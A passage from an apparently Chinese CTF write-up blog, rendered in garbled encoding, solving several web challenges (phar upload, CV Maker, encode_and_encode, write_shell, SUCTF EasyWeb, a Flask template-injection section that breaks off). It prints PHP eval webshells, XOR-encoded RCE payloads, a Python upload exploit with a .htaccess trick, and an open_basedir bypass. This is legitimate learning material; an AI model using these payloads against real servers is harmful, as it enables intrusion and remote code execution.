src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330214617285.png" alt="image-20220330214617285"></p><p>æ¥ä¸‹æ¥è¦æŠŠè¿™ä¸ªæ–‡ä»¶ä¸Šä¼ åˆ°ç›®æ ‡æœåŠ¡å™¨ï¼Œä½†æ˜¯åªå…è®¸å›¾ç‰‡è¿›è¡Œä¸Šä¼ </p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330214739536.png" alt="image-20220330214739536"></p><p>æ‰€ä»¥æˆ‘ä»¬æŠŠåç¼€æ”¹ä¸º.gifï¼Œè¿™å¹¶ä¸ä¼šå½±å“pharæ–‡ä»¶çš„è§£æ</p><p>æ¥ä¸‹æ¥è¦å¾—åˆ°æˆ‘ä»¬ä¸Šä¼ æ–‡ä»¶çš„è·¯å¾„</p><pre><code>$filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;; move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename); </code></pre><p>å¯¹æ–‡ä»¶åå’Œè¿œç¨‹åœ°å€è¿›è¡Œmd5åŠ å¯†ï¼Œåç¼€åŠ ä¸Šjpgï¼Œç”±æ­¤å¾—åˆ°æ–‡ä»¶å</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330220208000.png" alt="image-20220330220208000"></p><pre><code>0b0c73463194f72e78079b81d921c8f4.jpgè·¯å¾„ä¸º:xxx/upload/0b0c73463194f72e78079b81d921c8f4.jpg</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330220359594.png" alt="image-20220330220359594"></p><p>payload</p><pre><code>http://2895a638-1834-4f93-8e10-962056e63a83.node4.buuoj.cn:81/file.php?file=phar://upload/0b0c73463194f72e78079b81d921c8f4.jpg</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330220521789.png" alt="image-20220330220521789"></p><p>è§£å¯†ä¸€ä¸‹</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330220555486.png" alt="image-20220330220555486"></p><h2 id="WUSTCTF2020-CV-Maker"><a href="#WUSTCTF2020-CV-Maker" class="headerlink" title="[WUSTCTF2020]CV Maker"></a>[WUSTCTF2020]CV Maker</h2><p>ç®€å•æ–‡ä»¶ä¸Šä¼ ï¼Œè¿›å»åæ³¨å†Œè´¦å·ï¼Œç™»å½•ã€‚</p><p>å¯ä»¥ç›´æ¥ä¸Šä¼ PHPæ–‡ä»¶</p><p>ma.php</p><pre><code>GIF89a&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;x&#39;]);&lt;/script&gt;</code></pre><p>ç„¶åå¤åˆ¶å›¾ç‰‡é“¾æ¥ï¼Œåˆ°èšå‰‘ä¸­è¿æ¥</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220331141935935.png" alt="image-20220331141935935"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220331141947473.png" alt="image-20220331141947473"></p><h2 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h2><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220331142206699.png" alt="image-20220331142206699"></p><p>æŸ¥çœ‹æºä»£ç </p><pre><code class="php"> &lt;?phperror_reporting(0);if (isset($_GET[&#39;source&#39;])) &#123;  show_source(__FILE__);  exit();&#125;function is_valid($str) &#123;  $banword = [    // no path traversal    &#39;\.\.&#39;,    // no stream wrapper    &#39;(php|file|glob|data|tp|zip|zlib|phar):&#39;,    // no data exfiltration    &#39;flag&#39;  ];  $regexp = &#39;/&#39; . implode(&#39;|&#39;, $banword) . &#39;/i&#39;;  if (preg_match($regexp, $str)) &#123;    return false;  &#125;  return true;&#125;$body = file_get_contents(&#39;php://input&#39;); #bodyè·å–postæ•°æ®,åé¢ä¼šå¯¹è¿™è¿›è¡Œ$json = json_decode($body, true); #å¯¹è·å–å¾—æ•°æ®è¿›è¡Œè§£ç if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json[&#39;page&#39;])) &#123; #åˆ¤æ–­bodyæ˜¯å¦æœ‰æ•ˆï¼Œæ˜¯å¦å­˜åœ¨jsonæ•°æ®ï¼Œæ˜¯å¦å­˜åœ¨json[&#39;page&#39;]æ•°æ®   $page = $json[&#39;page&#39;];  $content = file_get_contents($page); #è¯»å–pageä¸­å¾—å†…å®¹  if (!$content || !is_valid($content)) &#123;    $content = &quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;;  &#125;&#125; else &#123;  $content = &#39;&lt;p&gt;invalid request&lt;/p&gt;&#39;;&#125;// no data exfiltration!!!$content = preg_replace(&#39;/HarekazeCTF\&#123;.+\&#125;/i&#39;, &#39;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#39;, $content);#åŒ¹é…è¿‡æ»¤å…³é”®å­—ctfecho json_encode([&#39;content&#39; =&gt; $content]); #å°†contentè¿›è¡Œjsonç¼–ç å¹¶è¾“å‡º</code></pre><p>åœ¨jsonä¸­ï¼Œå­—ç¬¦Unicodeç¼–ç ä¹‹åç­‰åŒäºè¯¥å­—ç¬¦ï¼Œæ¯”å¦‚phpç­‰åŒäº\u0070\u0068\u0070ã€‚</p><p>æ„é€ payload</p><pre><code>php://filter/read=convert.base64-encode/resource=/flag</code></pre><p>ç¼–ç ä¸‹</p><pre><code>\u0070\u0068\u0070://filter/read=convert.base64-encode/resource=/\u0066\u006c\u0061\u0067</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220331161734671.png" alt="image-20220331161734671"></p><p>è§£ç </p><pre><code>flag&#123;06495870-7a10-4628-b799-e860b1b58477&#125;</code></pre><h2 id="çº¢æ˜è°·CTF-2021-write-shell"><a href="#çº¢æ˜è°·CTF-2021-write-shell" class="headerlink" title="[çº¢æ˜è°·CTF 2021]write_shell"></a>[çº¢æ˜è°·CTF 2021]write_shell</h2><pre><code class="php">&lt;?phperror_reporting(0);highlight_file(__FILE__);function check($input)&#123;    if(preg_match(&quot;/&#39;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;,$input))&#123;        // if(preg_match(&quot;/&#39;| |_|=|php/&quot;,$input))&#123;        die(&#39;hacker!!!&#39;);    &#125;else&#123;        return $input;    &#125;&#125;function waf($input)&#123;  if(is_array($input))&#123;      foreach($input as $key=&gt;$output)&#123;          $input[$key] = waf($output);      &#125;  &#125;else&#123;      $input = check($input);  &#125;&#125;$dir = &#39;sandbox/&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]) . &#39;/&#39;;if(!file_exists($dir))&#123;    mkdir($dir);&#125;switch($_GET[&quot;action&quot;] ?? &quot;&quot;) &#123;    case &#39;pwd&#39;:        echo $dir;        break;    case &#39;upload&#39;:        $data = $_GET[&quot;data&quot;] ?? &quot;&quot;;        waf($data);        file_put_contents(&quot;$dir&quot; . &quot;index.php&quot;, $data);&#125;?&gt;</code></pre><p>ä»£ç å®¡è®¡</p><p><code>$a ?? 0 ç­‰åŒäº isset($a) ? $a : 0ã€‚</code></p><p>é¦–å…ˆçˆ†å‡ºè·¯å¾„</p><pre><code class="php">http://f6e38646-bc70-457d-9523-4bfbda2e6c4f.node4.buuoj.cn:81?action=pwd/sandbox/cc551ab005b2e60fbdc88de809b2c4b1/index.php</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220331214929182.png" alt="image-20220331214929182"></p><p>è¿™é“é¢˜è€ƒå¯Ÿçš„å°±æ˜¯shellçš„å†™å…¥ï¼Œä½†æ˜¯å®ƒè¿‡æ»¤äº†ä¸å°‘å…³é”®è¯</p><p>å…¶ä¸­è¿‡æ»¤äº†phpè¿™ä¸ªå…³é”®è¯ï¼Œä½†æ˜¯è¿™ä¸ªå¯ä»¥è¿›è¡Œç»•è¿‡</p><pre><code>PHPä¸­æœ‰ä¸¤ç§çŸ­æ ‡ç­¾ï¼Œ&lt;??&gt;å’Œ&lt;?=?&gt;ã€‚å…¶ä¸­ï¼Œ&lt;??&gt;ç›¸å½“äºå¯¹&lt;?php&gt;çš„æ›¿æ¢ã€‚è€Œ&lt;?=?&gt;åˆ™æ˜¯ç›¸å½“äº&lt;? echo&gt;å¤§éƒ¨åˆ†æ–‡ç« è¯´çŸ­æ ‡ç­¾éœ€è¦åœ¨php.iniä¸­è®¾ç½®short_open_tagä¸ºonæ‰èƒ½å¼€å¯çŸ­æ ‡ç­¾(é»˜è®¤æ˜¯å¼€å¯çš„ï¼Œä½†ä¼¼ä¹åˆé»˜è®¤æ³¨é‡Šï¼Œæ‰€ä»¥è¿˜æ˜¯ç­‰äºæ²¡å¼€å¯)ã€‚ä½†å®é™…ä¸Šåœ¨PHP5.4ä»¥åï¼Œæ— è®ºshort_open_tagæ˜¯å¦å¼€å¯ï¼Œ&lt;?=?&gt;è¿™ç§å†™æ³•æ€»æ˜¯é€‚ç”¨çš„ï¼Œ&lt;??&gt;è¿™ç§å†™æ³•åˆ™éœ€è¦short_open_tagå¼€å¯æ‰è¡Œã€‚</code></pre><pre><code>è¿‡æ»¤äº†ç©ºæ ¼â€˜ â€™å¯ä»¥ç”¨ \tæˆ–è€…%09(éœ€è¦phpç¯å¢ƒ) ä»£æ›¿</code></pre><p>æ„é€ payload</p><pre><code>http://f6e38646-bc70-457d-9523-4bfbda2e6c4f.node4.buuoj.cn:81?action=upload&amp;data=&lt;?=%09`cat%09/*`?&gt;</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220331225308163.png" alt="image-20220331225308163"></p><h2 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h2><pre><code class="php">&lt;?phpfunction get_the_flag()&#123;    // webadmin will remove your upload file every 20 min!!!!     $userdir = &quot;upload/tmp_&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;]);    if(!file_exists($userdir))&#123;    mkdir($userdir);    &#125;    if(!empty($_FILES[&quot;file&quot;]))&#123;        $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];        $name = $_FILES[&quot;file&quot;][&quot;name&quot;];        $extension = substr($name, strrpos($name,&quot;.&quot;)+1);    if(preg_match(&quot;/ph/i&quot;,$extension)) die(&quot;^_^&quot;);         if(mb_strpos(file_get_contents($tmp_name), &#39;&lt;?&#39;)!==False) die(&quot;^_^&quot;);    if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;);         $path= $userdir.&quot;/&quot;.$name;        @move_uploaded_file($tmp_name, $path);        print_r($path);    &#125;&#125;$hhh = @$_GET[&#39;_&#39;];if (!$hhh)&#123;    highlight_file(__FILE__);&#125;if(strlen($hhh)&gt;18)&#123;    die(&#39;One inch long, one inch strong!&#39;);&#125;if ( preg_match(&#39;/[\x00- 0-9A-Za-z\&#39;&quot;\`~_&amp;.,|=[\x7F]+/i&#39;, $hhh) )    die(&#39;Try something else!&#39;);$character_type = count_chars($hhh, 3);if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;);eval($hhh);?&gt;</code></pre><p>ä»£ç å®¡è®¡</p><p>æºç è´´ä¸Šæ¥ï¼š</p><p><a href="https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210150538110.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220210150538110.png" alt="image-20220210150538110"></a></p><p>ä»£ç å…¶å®å¯ä»¥åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼Œç¬¬ä¸€éƒ¨åˆ†æ˜¯æ–‡ä»¶ä¸Šä¼ ï¼Œç¬¬äºŒéƒ¨åˆ†æ˜¯rceã€‚</p><p>æˆ‘ä»¬å…ˆæ¥å°è¯•ä¸€ä¸‹rceï¼Œå¥½å®¶ä¼™ï¼Œè¿‡æ»¤äº†å¾ˆå¤šä¸œè¥¿å•Šã€‚</p><p><a href="https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210150849473.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220210150849473.png" alt="image-20220210150849473"></a></p><p>ç”±æ­¤åˆ¤æ–­ï¼Œè¿™æ˜¯æ— å­—æ¯æ— æ•°å­—rceï¼Œæœ‰ä¸‰ä¸ªæ€è·¯</p><p>1ã€å¼‚æˆ–</p><p>2ã€å–å</p><p>3ã€è‡ªå¢</p><p>ç”±äºè¿™é‡Œå¯¹å­—ç¬¦çš„é•¿åº¦æœ‰é™åˆ¶</p><p><a href="https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210150949879.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220210150949879.png" alt="image-20220210150949879"></a></p><p>æ•…é‡‡ç”¨å¼‚æˆ–ã€‚</p><p>è¿™é‡Œè´´ä¸Šå¤§ç¥çš„è„šæœ¬</p><pre><code>&lt;?phpfunction finds($string)&#123;    $index = 0;    $a=[33,35,36,37,40,41,42,43,45,47,58,59,60,62,63,64,92,93,94,123,125,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255];    for($i=27;$i&lt;count($a);$i++)&#123;        for($j=27;$j&lt;count($a);$j++)&#123;            $x = $a[$i] ^ $a[$j];            for($k = 0;$k&lt;strlen($string);$k++)&#123;                if(ord($string[$k]) == $x)&#123;                    echo $string[$k].&quot;\n&quot;;                    echo &#39;%&#39; . dechex($a[$i]) . &#39;^%&#39; . dechex($a[$j]).&quot;\n&quot;;                    $index++;                    if($index == strlen($string))&#123;                        return 0;                    &#125;                &#125;            &#125;        &#125;    &#125;&#125;finds(&quot;_GET&quot;);?&gt;</code></pre><p>è¿è¡Œå¦‚å›¾</p><p><a href="https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210151113658.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220210151113658.png" alt="image-20220210151113658"></a></p><p>ç”±æ­¤æˆ‘ä»¬å¯æ„é€ payloadï¼š</p><pre><code>http://127.0.0.1?_=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&%86=phpinfo```[![image-20220210152555350](ctfåˆ·é¢˜-ç¬¬ä¸€å‘¨é¢˜ç›®/image-20220210152555350.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210152555350.png)æˆåŠŸå‡ºæ¥phpinfoï¼Œçœ‹ä¸€çœ‹æœ‰æ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„ç‚¹[![image-20220210152650640](ctfåˆ·é¢˜-ç¬¬ä¸€å‘¨é¢˜ç›®/image-20220210152650640.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210152650640.png)å‘ç°æ‰§è¡Œç³»ç»Ÿçš„å‘½ä»¤å…¨è¢«ç¦ç”¨äº†ï¼Œçœ‹æ¥rceèµ°ä¸é€šäº†ã€‚è¿™é‡Œé¡ºå¸¦æä¸€å˜´ï¼Œåœ¨buuçš„ç¯å¢ƒä¸­å­˜åœ¨éé¢„æœŸè§£ï¼Œflagç›´æ¥åœ¨phpinfoé‡Œäº†[![image-20220210152821670](ctfåˆ·é¢˜-ç¬¬ä¸€å‘¨é¢˜ç›®/image-20220210152821670.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210152821670.png)ä¸è¿‡è¿˜æ˜¯æŒ‰ç…§åšé¢˜çš„å¥—è·¯æ¥å§ï¼ŒçœŸæ­£çš„æ¯”èµ›åº”è¯¥ä¸ä¼šå‡ºç°è¿™ç§æƒ…å†µã€‚æ—¢ç„¶rceèµ°ä¸é€šï¼Œé‚£å°±è¯•ä¸€è¯•æ–‡ä»¶ä¸Šä¼ å§[![image-20220210152933281](ctfåˆ·é¢˜-ç¬¬ä¸€å‘¨é¢˜ç›®/image-20220210152933281.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210152933281.png)å„ç§é™åˆ¶éå¸¸å¤šï¼Œè¿™é‡Œé™åˆ¶äº†ä¸Šä¼ phpåç¼€çš„æ–‡ä»¶ï¼Œæ‰€ä»¥è¦æƒ³åŠæ³•ç»•è¿‡ï¼Œæœ€å…ˆæƒ³åˆ°çš„å°±ç®—.htaccessè§£æã€‚ä½†æ˜¯ä¸Šä¼ .htaccessä»ç„¶æœ‰[![image-20220210204915083](ctfåˆ·é¢˜-ç¬¬ä¸€å‘¨é¢˜ç›®/image-20220210204915083.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210204915083.png)è¿™ä¸ªå‡½æ•°é™åˆ¶ã€‚è§£å†³è¿™ä¸ªå‡½æ•°ï¼Œé‡‡ç”¨xbmæ ¼å¼ï¼ŒX Bit Map```åœ¨è®¡ç®—æœºå›¾å½¢å­¦ä¸­ï¼ŒX Windowç³»ç»Ÿä½¿ç”¨X BitMapï¼ˆXBMï¼‰ï¼Œä¸€ç§çº¯æ–‡æœ¬äºŒè¿›åˆ¶å›¾åƒæ ¼å¼ï¼Œç”¨äºå­˜å‚¨X GUIä¸­ä½¿ç”¨çš„å…‰æ ‡å’Œå›¾æ ‡ä½å›¾XBMæ•°æ®ç”±ä¸€ç³»åˆ—åŒ…å«å•è‰²åƒç´ æ•°æ®çš„é™æ€æ— ç¬¦å·å­—ç¬¦æ•°ç»„ç»„æˆã€‚å½“æ ¼å¼è¢«æ™®éä½¿ç”¨æ—¶ï¼ŒXBMé€šå¸¸å‡ºç°åœ¨æ ‡é¢˜ï¼ˆ.hæ–‡ä»¶ï¼‰ä¸­ï¼Œæ¯ä¸ªå›¾åƒåœ¨æ ‡é¢˜ä¸­å­˜å‚¨ä¸€ä¸ªæ•°ç»„ã€‚ä»¥ä¸‹Cä»£ç ç¤ºä¾‹äº†ä¸€ä¸ªXBMæ–‡ä»¶ï¼š#define test_width 16#define test_height 7static char test_bits[] = &#123;0x13, 0x00, 0x15, 0x00, 0x93, 0xcd, 0x55, 0xa5, 0x93, 0xc5, 0x00, 0x80,0x00, 0x60 &#125;;```åœ¨è¿™ä¸ªcæ–‡ä»¶ä¸­é«˜å’Œå®½éƒ½æ˜¯æœ‰#åœ¨å‰é¢çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å³ä½¿æŠŠå®ƒæ”¾åœ¨.htaccessæ–‡ä»¶ä¸­ä¹Ÿä¸ä¼šå½±å“.htaccessçš„å®é™…è¿è¡Œæ•ˆæœã€‚æ‰€ä»¥æˆ‘ä»¬åœ¨.htaccessé‡ŒåŠ ä¸Š```#define width 1337#define height 1337..........```å°±å¯ä»¥ç»•è¿‡ç»•è¿‡è¿™ä¸ªå‡½æ•°äº†ã€‚ä¸Šä¼ .htaccessæ–‡ä»¶åï¼Œè¦ä¸Šä¼ ä¸€ä¸ªéphpåç¼€çš„ä¸€å¥è¯æœ¨é©¬ï¼Œä½†æœ¬é¢˜ä¸­ä»ç„¶å¯¹<?è¿›è¡Œäº†æ£€æµ‹ã€‚è¿™é‡Œæœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥ç»•è¿‡ã€‚1ã€å¯¹ä¸€å¥è¯æœ¨é©¬çš„å†…å®¹è¿›è¡Œbase64ç¼–ç ã€‚2ã€ä½¿ç”¨ utf-16be æ¥ç»•è¿‡ä¸‹é¢å…ˆé™„ä¸Šä¸¤ç§æ–¹æ³•çš„expï¼š1ã€```import requestsimport base64htaccess = b"""#define width 1337#define height 1337 AddType application/x-httpd-php .ahhhphp_value auto_append_file "php://filter/convert.base64-decode/resource=./shell.ahhh""""shell = b"GIF89a12" + base64.b64encode(b"<?php eval($_REQUEST['cmd']);?>")#è¿™é‡Œçš„GIF8912åé¢çš„12æ˜¯ä¸ºäº†ç¬¦åˆbase64 8ä¸ªå­—èŠ‚çš„ç¼–ç è§„èŒƒurl = "http://95670a2d-e895-4364-bb7b-94939098a4b6.node3.buuoj.cn/?_=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&%86=get_the_flag"files = &#123;'file':('.htaccess',htaccess,'image/jpeg')&#125;data = &#123;"upload":"Submit"&#125;response = requests.post(url=url, data=data, files=files)print(response.text)files = &#123;'file':('shell.ahhh',shell,'image/jpeg')&#125;response = requests.post(url=url, data=data, files=files)print(response.text)```æœ¬é¢˜phpç¯å¢ƒä¸º7.2ï¼Œæ‰€ä»¥æ— æ³•ä½¿ç”¨`<script language="php">eval($_REQUEST['shell']);</script>`è¿™æ¡payload,æ‰€ä»¥å°†shell.haè¿›è¡Œbase64ç¼–ç ä¹‹åï¼Œåœ¨.htaccessæ–‡ä»¶ä¸­åˆ©ç”¨filter://åè®®å°†æ–‡ä»¶è§£ç ï¼Œä»è€Œè¾¾åˆ°ä¼ å…¥shellçš„ç›®çš„ã€‚å¾—åˆ°[![image-20220210212049717](ctfåˆ·é¢˜-ç¬¬ä¸€å‘¨é¢˜ç›®/image-20220210212049717.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210212049717.png)2ã€```SIZE_HEADER = b"\n\n#define width 1337\n#define height 1337\n\n"def generate_php_file(filename, script):    phpfile = open(filename, 'wb')     phpfile.write(script.encode('utf-16be'))    phpfile.write(SIZE_HEADER)    phpfile.close()def generate_htacess():    htaccess = open('.htaccess', 'wb')    htaccess.write(SIZE_HEADER)    htaccess.write(b'AddType application/x-httpd-php .lethe\n')    htaccess.write(b'php_value zend.multibyte 1\n')    htaccess.write(b'php_value zend.detect_unicode 1\n')    htaccess.write(b'php_value display_errors 1\n')    htaccess.close()        generate_htacess()generate_php_file("shell.lethe", "<?php eval($_GET['cmd']); die(); ?>")```åŒç†ä¸Šä¼ å³å¯[![image-20220210212639842](ctfåˆ·é¢˜-ç¬¬ä¸€å‘¨é¢˜ç›®/image-20220210212639842.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210212639842.png)ä¸€å¥è¯æœ¨é©¬æˆåŠŸåˆ©ç”¨ã€‚ä½¿ç”¨èšå‰‘æˆåŠŸè¿æ¥[![image-20220210212824536](ctfåˆ·é¢˜-ç¬¬ä¸€å‘¨é¢˜ç›®/image-20220210212824536.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210212824536.png)ä½†æ˜¯æ— æ³•è®¿é—®æ ¹ç›®å½•ã€‚éé¢„æœŸè§£ï¼šé‡‡ç”¨èšå‰‘è‡ªå¸¦æ’ä»¶è¿›è¡Œç»•è¿‡.[![image-20220210213427872](ctfåˆ·é¢˜-ç¬¬ä¸€å‘¨é¢˜ç›®/image-20220210213427872.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210213427872.png)é¢„æœŸè§£ï¼šç»•è¿‡open_basedirè¿™é‡Œç”±äºæ¶‰åŠçš„å†…å®¹æˆ‘è¿˜ä¸å¤ªç†è§£ï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥æ”¾å‡ºpayloadï¼Œæœ‰å…´è¶£çš„å¤§ä½¬å¯ä»¥æ·±å…¥ç ”ç©¶ä¸€ä¸‹ã€‚```chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(scandir("/"));```[![image-20220210214135619](ctfåˆ·é¢˜-ç¬¬ä¸€å‘¨é¢˜ç›®/image-20220210214135619.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210214135619.png)æ‰€æœ‰æ–‡ä»¶è¢«åˆ—ä¸¾å‡ºæ¥äº†ï¼Œä¸‹é¢è¯»å–flagå€¼å°±å¯ä»¥äº†ã€‚[![image-20220210214447849](ctfåˆ·é¢˜-ç¬¬ä¸€å‘¨é¢˜ç›®/image-20220210214447849.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210214447849.png)## [RootersCTF2019]I_<3_Flask 10 11 15 2021 2022 è¿™é“é¢˜æ˜¯æ¨¡æ¿æ³¨å…¥ã€‚ [![image-20220211102608147](ctfåˆ·é¢˜-ç¬¬ä¸€å‘¨é¢˜ç›® image-20220211102608147.png)](https: sakurahack-y.github.io 02 rootersctf2019-i-3-flask-0x70-0x7f image-20220211102608147.png) é¦–å…ˆæŸ¥çœ‹æºä»£ç ï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆç”¨ã€‚ [![image-20220211102910418](ctfåˆ·é¢˜-ç¬¬ä¸€å‘¨é¢˜ç›® image-20220211102910418.png)](https: image-20220211102910418.png) dirsearchçˆ†ç ´ä¸€ä¸‹ï¼Œä»€ä¹ˆä¹Ÿæ²¡æœ‰ã€‚ [![image-20220211102929099](ctfåˆ·é¢˜-ç¬¬ä¸€å‘¨é¢˜ç›® image-20220211102929099.png)](https: image-20220211102929099.png) æœ¬é¢˜æ˜¯flaskç±»é¢˜ç›®ï¼Œctfå¸¸è€ƒç‚¹ä¸è¿‡å°±æ˜¯æ¨¡æ¿æ³¨å…¥ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å¯»æ‰¾å¯æ³¨å…¥å‚æ•°ï¼Œæœ¬åœ°å¹¶æ²¡æœ‰ç»™å‡ºï¼Œéœ€è¦æˆ‘ä»¬è‡ªå·±å»çˆ†ç ´ã€‚ æˆ‘ä»¬è¿™é‡Œé‡‡ç”¨arjunå·¥å…·è¿›è¡Œçˆ†ç ´ã€‚å·¥å…·é“¾æ¥ï¼šhttps: github.com s0md3v arjun [![image-20220211110028885](ctfåˆ·é¢˜-ç¬¬ä¸€å‘¨é¢˜ç›® image-20220211110028885.png)](https: image-20220211110028885.png)æœ€ç»ˆå¯çˆ†ç ´å‡ºæ¥å‚æ•°nameã€‚ [![image-20220211105238512](ctfåˆ·é¢˜-ç¬¬ä¸€å‘¨é¢˜ç›® image-20220211105238512.png)](https: image-20220211105238512.png) [![image-20220211105250064](ctfåˆ·é¢˜-ç¬¬ä¸€å‘¨é¢˜ç›® image-20220211105250064.png)](https: image-20220211105250064.png) æµ‹è¯•äº†ä¸€ä¸‹çš„ç¡®å­˜åœ¨æ¨¡æ¿æ³¨å…¥ã€‚ æ¥ä¸‹æ¥å°±æ˜¯å¯¹æ¼æ´çš„åˆ©ç”¨ã€‚ **æ¼æ´åˆ©ç”¨** **1ã€å·¥å…·tplmap** [![image-20220211110242684](ctfåˆ·é¢˜-ç¬¬ä¸€å‘¨é¢˜ç›® image-20220211110242684.png)](https: image-20220211110242684.png) [![image-20220211110254561](ctfåˆ·é¢˜-ç¬¬ä¸€å‘¨é¢˜ç›® image-20220211110254561.png)](https: image-20220211110254561.png) æˆåŠŸï¼Œå‘ç°ä¸ºjinja2æ¨¡æ¿ï¼Œåœ¨ctfé¢˜ç›®ä¸­ç»å¸¸è€ƒå¯Ÿ ç›´æ¥â€“os-shellæ‹¿ä¸‹shellï¼Œè¯»å–flag [![image-20220211110436293](ctfåˆ·é¢˜-ç¬¬ä¸€å‘¨é¢˜ç›® image-20220211110436293.png)](https: image-20220211110436293.png) **2ã€æ‰‹å·¥åˆ©ç”¨** åªä¼šå·¥å…·å½“ç„¶ä¸è¡Œï¼Œæœ‰æ—¶å€™å·¥å…·æ— 